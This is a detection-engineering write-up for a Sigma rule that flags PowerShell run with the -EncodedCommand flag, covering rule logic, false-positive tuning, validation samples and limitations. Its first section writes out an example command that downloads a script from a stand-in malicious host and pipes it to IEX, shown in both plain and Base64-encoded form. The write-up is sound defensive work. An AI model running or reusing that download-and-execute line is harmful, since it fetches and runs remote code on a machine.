# Investigation Write-up: PowerShell Encoded Command Detection

## 1. The technique

PowerShell has a built-in flag, `-EncodedCommand` (often shortened to `-enc` or `-e`), that accepts a Base64-encoded string instead of a plain-text command. PowerShell decodes it internally and runs it as if it had been typed normally.

This exists for legitimate reasons mainly to safely pass commands containing special characters (quotes, pipes, newlines) between processes without them breaking. But attackers use it for a different reason: obfuscation. A command like this:

```
powershell.exe -Command "Invoke-WebRequest -Uri http://malicious-site.com/payload.ps1 | IEX"
```

is immediately readable and suspicious to anyone scanning logs. The same command, encoded:

```
powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8A...
```

looks like meaningless noise. A human or a naive detection rule that just searches for suspicious keywords like "Invoke-WebRequest" won't catch it, because the malicious keywords are hidden inside the encoding. This is why encoded PowerShell is flagged as its own distinct technique in MITRE ATT&CK ([T1059.001](https://attack.mitre.org/techniques/T1059/001/), execution; [T1027](https://attack.mitre.org/techniques/T1027/), obfuscation), separate from just "PowerShell was used."

## 2. The detection logic

Rather than trying to decode and inspect the Base64 content itself (which adds complexity and can be evaded further), this rule takes a simpler and more reliable approach: **flag the use of the encoding flag itself.**

The reasoning: legitimate use of `-EncodedCommand` in day-to-day admin work is relatively rare compared to plain commands. So instead of asking "is this specific decoded command malicious?", the rule asks a cheaper, broader question: "is PowerShell being run in a way that hides what it's doing?" and lets a human analyst investigate further once flagged.

Two fields are checked together:
- `Image` — confirms the process launched was actually `powershell.exe`, not some unrelated program.
- `CommandLine` — checked for any of several common encoding flag variations (`-EncodedCommand`, `-enc`, `-e`, `-Enc`), since attackers and tools don't always use the full flag name.

Both must be true for the rule to fire, this is intentional. Checking `CommandLine` alone would false-positive on nothing (since command lines contain lots of PowerShell reference to shells that aren't PowerShell.exe), and checking `Image` alone would flag every single PowerShell execution in the company, which is far too broad to be useful.

## 3. Design decisions: handling false positives

Encoding isn't inherently malicious, some legitimate automation tools use `-EncodedCommand` for the exact reason described above (safely passing complex arguments). Rather than ignore this, the rule explicitly documents it:

- `filter_legit` excludes a known internal automation script path (`legitimate-automation.ps1`) as a placeholder example of how a real SOC would tune out a known-safe source.
- The `falsepositives` field in the Sigma rule itself documents two categories of expected noise: admin scripts using encoding for character-limit reasons, and configuration management tools (e.g. Ansible, SCCM) that may trigger this pattern legitimately.

This matters because a detection rule that isn't tuned for known-legitimate behavior creates **alert fatigue**, SOC analysts start ignoring a rule that fires too often on harmless activity, which defeats its purpose entirely. Documenting expected false positives up front, even before deployment, is standard practice in mature detection engineering.

## 4. Validation

To confirm the rule's logic behaves as intended before considering it "production-ready," two representative log samples were tested against it:

**True positive**, simulates an attacker running an encoded command:
```json
{
  "Image": "C:\\Windows\\System32\\powershell.exe",
  "CommandLine": "powershell.exe -EncodedCommand aGVsbG8gd29ybGQ="
}
```
Result: rule correctly triggers.

**True negative**, simulates a normal, benign PowerShell command:
```json
{
  "Image": "C:\\Windows\\System32\\powershell.exe",
  "CommandLine": "powershell.exe -Command Get-Date"
}
```
Result: rule correctly does not trigger.

Both cases are automated in `tests/test_detection_rule.py`, and re-run automatically on every change via the project's CI pipeline (see `.github/workflows/ci.yml`), so any future edit to the rule that accidentally breaks either case is caught immediately rather than silently shipping.

## 5. Limitations

This rule is intentionally narrow, and it's worth being explicit about what it does *not* catch:

- **It does not inspect the decoded content.** A sophisticated attacker could split, chain, or further obfuscate the payload in ways that still evade a human reviewing the raw decoded output.
- **It relies on the encoding flag itself being present and visible in logs.** Some attack tooling can invoke PowerShell in ways that avoid generating a normal `CommandLine` entry altogether (e.g. via direct API calls rather than the command-line interface), which would bypass this detection entirely.
- **It does not correlate with other behavior.** A single encoded PowerShell execution, on its own, is a weak signal in isolation. In a mature SOC, this rule would ideally feed into a broader correlation pipeline (e.g. combined with unusual parent process, network connections, or off-hours activity) rather than being treated as a standalone high-confidence alert.

These limitations aren't a flaw in the rule, they're the normal boundary of what any single, narrow detection rule can reasonably cover. Documenting them is part of being honest about what a rule does and doesn't protect against.
